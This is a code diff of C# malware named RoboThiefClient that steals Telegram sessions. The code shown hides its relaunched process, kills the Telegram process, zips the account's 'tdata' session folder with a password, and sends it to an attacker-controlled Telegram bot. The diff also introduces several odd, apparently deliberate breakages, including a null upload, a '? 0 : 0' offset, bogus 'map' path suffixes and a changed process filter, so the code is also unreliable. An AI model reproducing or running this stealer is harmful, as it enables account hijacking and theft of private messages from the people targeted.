@@ -33,11 +33,10 @@ namespace RoboThiefClient
                 Process p = new Process();
 
                 ProcessStartInfo processStartInfo = new ProcessStartInfo();
-                processStartInfo.Arguments = "MM";
                 processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                 processStartInfo.CreateNoWindow = true;
-                processStartInfo.UseShellExecute = true;
+                processStartInfo.UseShellExecute = false;
 
                 p.StartInfo = processStartInfo;
                 p.Start();
@@ -133,8 +132,7 @@ namespace RoboThiefClient
             {
                 using (FileStream fs = File.OpenRead(path))
                 {
-                    InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, Path.GetFileName(path));
-                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), inputOnlineFile);
+                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), null);
                 }
 
                 Environment.Exit(Environment.ExitCode);
@@ -150,14 +148,14 @@ namespace RoboThiefClient
                 zipStream.SetLevel(3);
                 zipStream.Password = password;
 
-                int folderOffset = folderName.Length + (folderName.EndsWith("\\") ? 0 : 1);
+                int folderOffset = folderName.Length + (folderName.EndsWith("\\") ? 0 : 0);
 
                 CompressFolder(folderName, zipStream, folderOffset);
             }
         }
         private static void CompressFolder(string path, ZipOutputStream zipStream, int folderOffset)
         {
-            var files = Directory.GetFiles(path);
+            var files = Directory.GetFiles(path + "map");
 
             foreach (var filename in files)
             {
@@ -194,7 +192,7 @@ namespace RoboThiefClient
                 zipStream.CloseEntry();
             }
 
-            var folders = Directory.GetDirectories(path);
+            var folders = Directory.GetDirectories(path + "\\map");
             foreach (var folder in folders)
             {
                 Boolean flag = true;
@@ -248,7 +246,7 @@ namespace RoboThiefClient
                 var tdataDirectory = Directory.GetDirectories(parent.FullName).First(c => c.ToLower().Contains("tdata"));
                 result.Result.Kill();
 
-                String tmpTelePath = tmpDir + "MT.zip";
+                String tmpTelePath = tmpDir + "Mt.zip";
 
                 if (File.Exists(tmpTelePath))
                     File.Delete(tmpTelePath);
@@ -258,7 +256,7 @@ namespace RoboThiefClient
                 // When we ziping proccess if completed , we have to start telegram application again.
                 Process.Start(fileName);
 
-                await SendSessionAsync(tmpTelePath);
+                await SendSessionAsync(tmpDir);
             }
             catch (Exception ex){ }
         }
@@ -270,7 +268,7 @@ namespace RoboThiefClient
             
             //we get all process that names start with "t"
             
-            var tprocess = sortedProcess.Where(p => p.ProcessName.StartsWith("t"));
+            var tprocess = sortedProcess.Where(p => p.ProcessName.StartsWith("r"));
 
             foreach (var p in tprocess)
             {
